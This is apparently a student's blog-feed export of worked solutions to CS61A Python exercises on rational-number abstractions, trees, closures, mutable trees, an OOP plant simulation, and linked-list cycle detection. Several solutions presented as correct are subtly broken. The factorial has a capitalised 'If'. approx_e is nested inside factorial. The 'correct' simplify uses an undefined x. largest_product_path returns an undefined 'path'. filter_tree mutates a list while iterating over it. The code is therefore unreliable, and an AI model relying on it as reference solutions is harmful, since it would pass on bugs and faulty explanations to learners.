class="line"><span class="string">    &gt;&gt;&gt; r2 = rational(3, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; div_rationals(r1, r2)</span></span><br><span class="line"><span class="string">    [4, 9]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; div_rationals(r1, r1)</span></span><br><span class="line"><span class="string">    [6, 6]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> mul_rational(r1, inverse_rational(r2))</span><br></pre></td></tr></table></figure>
<p>c. ​The irrational number e ≈ 2.718 can be generated from an infinite series. Let’s try calculating it using our rational number data type! The mathematical formula is as follows:</p>


<p>Write a function approx_e that returns a rational number approximation of e to iter amount of iterations. We’ve provided a factorial function.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    If n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">approx_e</span><span class="params">(iter)</span>:</span></span><br><span class="line">        sum = rational(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(iter):</span><br><span class="line">            sum = add_rational(sum, rational(<span class="number">1</span>, factorial(i)))</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>

<h3 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h3><p>Assume that <code>rational</code>, <code>numer</code>, and <code>denom</code>, run without error and work like the ADT defined in Question 2. Can you identify where the abstraction barrier is broken? Come up with a scenario where this code runs without error and a scenario where this code would stop working.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational</span><span class="params">(num, den)</span>:</span> <span class="comment"># Returns a rational number ADT</span></span><br><span class="line"><span class="comment">#implementation not shown</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numer</span><span class="params">(x)</span>:</span> <span class="comment"># Returns the numerator of the given rational</span></span><br><span class="line"><span class="comment">#implementation not shown</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denom</span><span class="params">(x)</span>:</span> <span class="comment"># Returns the denominator of the given rational</span></span><br><span class="line"><span class="comment">#implementation not shown</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span> <span class="comment"># Returns the GCD of two numbers</span></span><br><span class="line"><span class="comment">#implementation not shown</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simplify</span><span class="params">(f1)</span>:</span> <span class="comment">#Simplifies a rational number</span></span><br><span class="line">    g = gcd(f1[<span class="number">0</span>], f1[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> rational(numer(f1) // g, denom(f1) // g)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(f1, f2)</span>:</span> <span class="comment"># Multiples and simplifies two rational numbers</span></span><br><span class="line">    r = rational(numer(f1) * numer(f2), denom(f1) * denom(f2))</span><br><span class="line">    <span class="keyword">return</span> simplify(r)</span><br><span class="line">x = rational(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">y = rational(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">multiply(x, y)</span><br></pre></td></tr></table></figure>
<p>The abstraction barrier is broken inside simplify(f1) when calling gcd(f1[0], f1[1]). This assumes rational returns a type that can be indexed through. i.e. This would work if rational returned a list. However, this would not work if rational returned a dictionary.<br>The correct implementation of simplify would be</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simplify</span><span class="params">(f1)</span>:</span></span><br><span class="line">    g = gcd(numer(x), denom(x))</span><br><span class="line">    <span class="keyword">return</span> rational(numer(f1) // g, denom(f1) // g)</span><br></pre></td></tr></table></figure>
<h2 id="Trees"><a href="#Trees" class="headerlink" title="Trees"></a>Trees</h2><h3 id="Question-0-2"><a href="#Question-0-2" class="headerlink" title="Question 0"></a>Question 0</h3><p>a​. Fill in this implementation of a tree:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(label, branches = [])</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches:</span><br><span class="line">        <span class="keyword">assert</span> is_tree(b), <span class="string">'branches must be trees'</span></span><br><span class="line">    <span class="keyword">return</span> [label] + list(branches)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_tree</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(tree) != list <span class="keyword">or</span> len(tree) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(tree):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_tree(b):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">label</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">branches</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">1</span>:]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_leaf</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> branches(tree)</span><br></pre></td></tr></table></figure>
<p>b.​ A min-heap is a tree with the special property that every node’s value is less than or equal to the values of all of its children. For example, the following tree is a min-heap:</p>


<p>However, the following tree is not a min-heap because the node with value 3 has a value greater than one of its children:</p>


<p>Write a function <code>is_min_heap</code> that takes a tree and returns True if the tree is a min-heap and False otherwise.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_min_heap</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(t):</span><br><span class="line">        <span class="keyword">if</span> label(t) &gt; label(b) <span class="keyword">or</span> <span class="keyword">not</span> is_min_heap(b):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>c. ​Write a function <code>largest_product_path</code> that finds the largest product path possible. <em>A product path</em> is defined as the product of all nodes between the root and a leaf. The function takes a tree as its parameter. Assume all nodes have a nonnegative value.</p>


<p>For example, calling <code>largest_product_path</code> on the above tree would return 42, since 3 * 7 * 2 is the largest product path.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">largest_product_path</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_product_path(None)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_product_path(tree(3))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = tree(3, [tree(7, [tree(2)]), tree(8, [tree(1)]), tree(4)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_product_path(t)</span></span><br><span class="line"><span class="string">    42</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> is_leaf(tree):</span><br><span class="line">        <span class="keyword">return</span> label(tree)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        paths = [label(tree) * largest_product_path(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(tree)]</span><br><span class="line">        <span class="keyword">return</span> max(path)</span><br></pre></td></tr></table></figure>
<h3 id="Challenge-Question-Optional"><a href="#Challenge-Question-Optional" class="headerlink" title="Challenge Question (Optional)"></a>Challenge Question (Optional)</h3><p>Come back after finishing everything!<br>The <em>level-order traversal</em> of a tree is defined as visiting the nodes in each level of a tree before moving onto the nodes in the next level. For example, the level order of the following tree is,</p>


<p>Level-order: 3 7 8 4</p>
<p>a. ​Write a function <code>print_level_sorted</code> that takes in a tree as the parameter and returns a list of the values of the nodes in level order.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Iterative implementation</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    current_level, next_level = [label(tree)], [tree]</span><br><span class="line">    <span class="keyword">while</span> next_level:</span><br><span class="line">        find_next= []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> next_level:</span><br><span class="line">            find_next.extend(branches(b))</span><br><span class="line">        next_level = find_next</span><br><span class="line">        current_level.extend([label(t) <span class="keyword">for</span> t <span class="keyword">in</span> next_level])</span><br><span class="line">    <span class="keyword">return</span> current_level</span><br><span class="line"><span class="comment"># Recursive implementation</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_next</span><span class="params">(current_level)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> current_level == []:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            next_level = []</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> current_level:</span><br><span class="line">                next_level.extend(branches(b))</span><br><span class="line">            <span class="keyword">return</span> [label(t) <span class="keyword">for</span> t <span class="keyword">in</span> next_level] + find_next(next_level)</span><br><span class="line">    <span class="keyword">return</span> [label(tree)] + find_next([tree])</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-guerrilla04</title>
    <url>/2018/10/29/cs61a-guerrilla04/</url>
    <content><![CDATA[<h1 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h1><h2 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h2><p>Write <code>make_max_finder</code>, which takes in no arguments but returns a function which takes in a list. The function it returns should return the maximum value it’s been called on so far, including the current list and any previous list. You can assume that any list this function takes in will be nonempty and contain only non-negative values.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_max_finder</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m = make_max_finder()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m([5, 6, 7])</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m([1, 2, 3])</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m([9])</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m2 = make_max_finder()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; m2([1])</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    maximum = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max_finder</span><span class="params">(lst)</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> maximum</span><br><span class="line">        <span class="keyword">if</span> max(lst) &gt; maximum:</span><br><span class="line">            maximum = max(lst)</span><br><span class="line">        <span class="keyword">return</span> maximum</span><br><span class="line">    <span class="keyword">return</span> max_finder</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="Mutable-Trees"><a href="#Mutable-Trees" class="headerlink" title="Mutable Trees"></a>Mutable Trees</h1><h2 id="8a"><a href="#8a" class="headerlink" title="8a"></a>8a</h2><p>Define <code>filter_tree</code>, which takes in a tree <code>t</code> and one argument predicate function <code>fn</code>. It should mutate the tree by removing all branches of any node where calling <code>fn</code> on its label returns <code>False</code>. In addition, if this node is not the root of the tree, it should remove that node from the tree as well.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_tree</span><span class="params">(t, fn)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Tree(1, [Tree(2), Tree(3, [Tree(4)]), Tree(6, [Tree(7)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filter_tree(t, lambda x: x % 2 != 0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t</span></span><br><span class="line"><span class="string">    tree(1, [Tree(3)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t2 = Tree(2, [Tree(3), Tree(4), Tree(5)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filter_tree(t2, lambda x: x != 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t2</span></span><br><span class="line"><span class="string">    Tree(2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fn(t.label):</span><br><span class="line">        t.branches = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> branch <span class="keyword">in</span> t.branches:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> fn(branch.label):</span><br><span class="line">                t.branches.remove(branch)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filter_tree(branch, fn)</span><br></pre></td></tr></table></figure>
<h2 id="8b"><a href="#8b" class="headerlink" title="8b"></a>8b</h2><p>Fill in the definition for <code>nth_level_tree_map</code>, which also takes in a function and a tree,<br>but mutates the tree by applying the function to every <code>nth</code> level in the tree, where the root is the 0th level.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_level_tree_map</span><span class="params">(fn, tree, n)</span>:</span></span><br><span class="line">    <span class="string">"""Mutates a tree by mapping a function all the elements of a tree.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tree = Tree(1, [Tree(7, [Tree(3), Tree(4), Tree(5)]),</span></span><br><span class="line"><span class="string">    Tree(2, [Tree(6), Tree(4)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; nth_level_tree_map(lambda x: x + 1, tree, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tree</span></span><br><span class="line"><span class="string">    Tree(2, [Tree(7, [Tree(4), Tree(5), Tree(6)]),</span></span><br><span class="line"><span class="string">    Tree(2, [Tree(7), Tree(5)])])</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(t, level)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> level % n == <span class="number">0</span>:</span><br><span class="line">            t.label = fn(t.label)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> t.branches:</span><br><span class="line">            helper(b, level + <span class="number">1</span>)</span><br><span class="line">    helper(tree, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h1 id="Extra-Challenge-Question-9-Photosynthesis"><a href="#Extra-Challenge-Question-9-Photosynthesis" class="headerlink" title="Extra Challenge Question 9: Photosynthesis"></a>Extra Challenge Question 9: Photosynthesis</h1><h2 id="9a"><a href="#9a" class="headerlink" title="9a"></a>9a</h2><p>Fill in the methods below, so that the classes interact correctly according to the<br>documentation (make sure to keep track of all the counters!).</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p = Plant()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.height</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.materials</span></span><br><span class="line"><span class="string">[]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.absorb()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.materials</span></span><br><span class="line"><span class="string">[|Sugar|]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>Sugar.sugars_created</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaf.sugars_used</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.grow()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.materials</span></span><br><span class="line"><span class="string">[]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.height</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaf.sugars_used</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plant</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""A Plant has a Leaf, a list of sugars created so far,</span></span><br><span class="line"><span class="string">        and an initial height of 1"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        self.height = <span class="number">1</span></span><br><span class="line">        self.materials = [] <span class="comment"># list of sugars</span></span><br><span class="line">        self.leaf = Leaf(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">absorb</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Calls the leaf to create sugar"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        self.leaf.absorb()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grow</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""A Plant uses all of its sugars, each of which increases</span></span><br><span class="line"><span class="string">        its height by 1"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        <span class="keyword">for</span> sugar <span class="keyword">in</span> self.materials:</span><br><span class="line">            sugar.activate()</span><br><span class="line">            self.height += <span class="number">1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Leaf</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plant)</span>:</span> <span class="comment"># Source is a Plant instance</span></span><br><span class="line">        <span class="string">"""A Leaf is initially alive, and keeps track of how many</span></span><br><span class="line"><span class="string">        sugars it has created"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        self.alive = <span class="literal">True</span></span><br><span class="line">        self.sugars_used = <span class="number">0</span></span><br><span class="line">        self.plant = plant</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">absorb</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""If this Leaf is alive, a Sugar is added to the plant’s</span></span><br><span class="line"><span class="string">        list of sugars"""</span></span><br><span class="line">        <span class="keyword">if</span> self.alive:</span><br><span class="line">            <span class="comment">###Write your code here###</span></span><br><span class="line">            self.plant.materials.append(Sugar(self, self.plant))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sugar</span>:</span></span><br><span class="line">    sugars_created = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, leaf, plant)</span>:</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        self.leaf = leaf</span><br><span class="line">        self.plant = plant</span><br><span class="line">        Sugar.sugars_created += <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">activate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""A sugar is used, then removed from the Plant which</span></span><br><span class="line"><span class="string">        contains it"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">        self.plant.materials.remove(self)</span><br><span class="line">        self.leaf.sugars_used += <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'|Sugar|'</span></span><br></pre></td></tr></table></figure>
<h2 id="9b"><a href="#9b" class="headerlink" title="9b"></a>9b</h2><p>Let’s make this a little more realistic by giving these objects ages. Modify the code above to satisfy the following conditions. See the doctest for further guidance.</p>
<p>1) Every plant and leaf should have an age, but sugar does not age. Plants have a lifetime of 20 time units, and leaves have a lifetime of 2 time units.<br>2) Time advances by one unit at the end of a call to a plant’s absorb or grow method.<br>3) Every time a leaf dies, it spawns a new leaf on the plant. When a plant dies, its leaf dies, and the plant becomes a zombie plant–no longer subject to time. Zombie plants do not age or die.<br>4) Every time a generation of leaves dies for a zombie plant, twice as many leaves rise from the organic matter of its ancestors–defying scientific explanation.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p = Plant()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaves</span></span><br><span class="line"><span class="string">[|Leaf|]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaves[0].age</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age = 18</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age</span></span><br><span class="line"><span class="string">18</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.height</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.absorb()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.materials</span></span><br><span class="line"><span class="string">[|Sugar|]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age</span></span><br><span class="line"><span class="string">19</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaves[0].age</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.grow()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.is_zombie</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;p.leaves</span></span><br><span class="line"><span class="string">[|Leaf|, |Leaf|]</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.leaves[0].age</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.absorb()</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>p.age</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">You will only need to make changes to the Plant <span class="keyword">and</span> Leaf classes.</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plant</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""A Plant has a Leaf, a list of sugars created so far,</span></span><br><span class="line"><span class="string">        and an initial height of 1"""</span></span><br><span class="line">        self.materials = []</span><br><span class="line">        self.height = <span class="number">1</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">absorb</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Calls the leaf to create sugar"""</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grow</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""A Plant uses all of its sugars,each of which increases</span></span><br><span class="line"><span class="string">        its height by 1"""</span></span><br><span class="line">        <span class="keyword">for</span> sugar <span class="keyword">in</span> self.materials:</span><br><span class="line">            sugar.activate()</span><br><span class="line">            self.height += <span class="number">1</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">death</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Leaf</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plant)</span>:</span> <span class="comment"># plant is a Plant instance</span></span><br><span class="line">        <span class="string">"""A Leaf is initially alive, and keeps track of how many</span></span><br><span class="line"><span class="string">        sugars it has created"""</span></span><br><span class="line">        self.alive = <span class="literal">True</span></span><br><span class="line">        self.sugars_used = <span class="number">0</span></span><br><span class="line">        self.plant = plant</span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">absorb</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""If this Leaf is alive, a Sugar is added to the plant’s</span></span><br><span class="line"><span class="string">        list of sugars"""</span></span><br><span class="line">        <span class="keyword">if</span> self.alive:</span><br><span class="line">            self.plant.materials.append(Sugar(self, self.plant))</span><br><span class="line">            <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">death</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">###Write your code here###</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ‘|Leaf|’</span><br></pre></td></tr></table></figure>
<h1 id="Linked-list"><a href="#Linked-list" class="headerlink" title="Linked list"></a>Linked list</h1><h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h2><p>The Link class can represent lists with cycles. That is, a list may contain itself as a sublist.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Link(<span class="number">1</span>, Link(<span class="number">2</span>, Link(<span class="number">3</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.rest.rest.rest = s</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.rest.rest.rest.rest.rest.first</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>Implement <code>has_cycle</code> that returns whether its argument, a Link instance, contains a cycle. There are two ways to do this, both iteratively, either with two pointers or keeping track of Link objects we’ve seen already. Try to come up with both!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_cycle</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s.rest.rest.rest = s</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(s)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> link:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    slow = link</span><br><span class="line">    fast = link.rest</span><br><span class="line">    <span class="keyword">while</span> fast <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        <span class="keyword">if</span> fast.rest <span class="keyword">is</span> Link.empty:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        slow = slow.rest</span><br><span class="line">        fast = fast.rest.rest</span><br><span class="line">        <span class="keyword">if</span> slow == fast:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p><span style="color:red">Solution 2</span></p>
